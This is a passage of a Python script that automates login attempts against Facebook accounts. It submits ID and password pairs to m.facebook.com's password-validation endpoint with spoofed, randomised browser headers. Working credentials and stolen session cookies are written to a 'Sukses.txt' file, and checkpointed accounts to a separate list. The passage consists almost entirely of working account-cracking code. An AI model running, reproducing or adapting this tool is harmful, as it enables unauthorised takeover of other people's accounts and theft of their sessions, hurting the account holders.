        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': agent,
        'viewport-width': f'{dc(1111,9999)}',}
        urlval = dex.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&login?skip_api_login=1&api_key=127502793959418&kid_directed_site=0&app_id=127502793959418&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D127502793959418%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fwww.ilovepdf.com%252Fauth%252Fauth%253Fauthclient%253Dfacebook%26xoauth_displayname%3DMy%2BApplication%26scope%3Demail%26state%3Ddf51dc4b300b79cb376e3e430f59cc3c1d69b813498f94548262fc7d1326fafe%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbf3f5e2e-f5ab-4527-a19b-ee745b7a07d5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ilovepdf.com%2Fauth%2Fauth%3Fauthclient%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Ddf51dc4b300b79cb376e3e430f59cc3c1d69b813498f94548262fc7d1326fafe%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',headers=hedere)
        couz = (';').join([f'{key}={value}' for key,value in urlval.cookies.get_dict().items()])
        dadi = {
        'lsd': re.search('name="lsd" value="(.*?)"',str(urlval.text)).group(1),
        'jazoest': re.search('name="jazoest" value="(\d+)"',str(urlval.text)).group(1),
        'uid': idf,
        'next': 'https://m.facebook.com/dialog/oauth?client_id=127502793959418&response_type=code&redirect_uri=https%3A%2F%2Fwww.ilovepdf.com%2Fauth%2Fauth%3Fauthclient%3Dfacebook&xoauth_displayname=My+Application&scope=email&state=df51dc4b300b79cb376e3e430f59cc3c1d69b813498f94548262fc7d1326fafe&ret=login&fbapp_pres=0&logger_id=bf3f5e2e-f5ab-4527-a19b-ee745b7a07d5&tp=unspecified',
        'flow': 'login_no_pin',
        'encpass': f'#PWD_BROWSER:0:{int(time.time())}:{pw}',}

        hederd = {'authority': 'm.facebook.com',
        'accept': '*/*',
        'accept-language': f'id-ID,id;q={dc(1,90)}.{dc(90,999)},en-US;q={dc(1,70)}.{dc(70,999)},en;q={dc(1,70)}.{dc(70,999)}',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://m.facebook.com',
        'referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&login?skip_api_login=1&api_key=127502793959418&kid_directed_site=0&app_id=127502793959418&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D127502793959418%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fwww.ilovepdf.com%252Fauth%252Fauth%253Fauthclient%253Dfacebook%26xoauth_displayname%3DMy%2BApplication%26scope%3Demail%26state%3Ddf51dc4b300b79cb376e3e430f59cc3c1d69b813498f94548262fc7d1326fafe%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbf3f5e2e-f5ab-4527-a19b-ee745b7a07d5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ilovepdf.com%2Fauth%2Fauth%3Fauthclient%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Ddf51dc4b300b79cb376e3e430f59cc3c1d69b813498f94548262fc7d1326fafe%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
        'sec-ch-prefers-color-scheme': 'dark',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="47", "Google Chrome";v="47"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"iOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': agent,
        'x-asbd-id': '129477',
        'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(urlval.text)).group(1),}
        dex.post('https://m.facebook.com/login/device-based/validate-password/?api_key=127502793959418&auth_token=9fa50444a20cee42982ece8cde6d3ba5&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D127502793959418%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fwww.ilovepdf.com%252Fauth%252Fauth%253Fauthclient%253Dfacebook%26xoauth_displayname%3DMy%2BApplication%26scope%3Demail%26state%3Ddf51dc4b300b79cb376e3e430f59cc3c1d69b813498f94548262fc7d1326fafe%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbf3f5e2e-f5ab-4527-a19b-ee745b7a07d5%26tp%3Dunspecified&refsrc=deprecated&app_id=127502793959418&cancel=https%3A%2F%2Fwww.ilovepdf.com%2Fauth%2Fauth%3Fauthclient%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Ddf51dc4b300b79cb376e3e430f59cc3c1d69b813498f94548262fc7d1326fafe%23_%3D_&lwv=100',data=dadi,cookies={'cookie':couz},headers=hederd,allow_redirects=True)
        if 'c_user' in dex.cookies.get_dict().keys():
          ok+=1
          coki = (';').join([f'{key}={value}' for key,value in dex.cookies.get_dict().items()])
          open('Data/OK/'+'Sukses.txt','a').write(f'{idf}|{pw}|{coki}\n')
          tre = Tree('')
          tre.add(f'[bold green]{idf}')
          tre.add(f'[bold green]{pw}')
          tre.add(f'[bold green]{coki}')
          console.print(tre,style='bold purple')
          break
        elif 'checkpoint' in dex.cookies.get_dict().keys():
          cp+=1
          open('Data/CP/'+'Failed.txt','a').write(f'{idf}|{pw}\n')
          tre = Tree('')
          tre.add(f'[bold yellow]{idf}')
          tre.add(f'[bold yellow]{pw}')
          tre.add(f'[bold yellow]{used}')
          console.print(tre,style='bold red')
          break
        else:
          continue
      except requests.exceptions.ConnectionError:
        time.sleep(30)
    except Exception as d:
      pass
  loop+=1
if __name__ == '__main__':
  try:os.mkdir('Data');os.mkdir('Data/OK');os.mkdir('Data/CP')
  except:pass
  public()
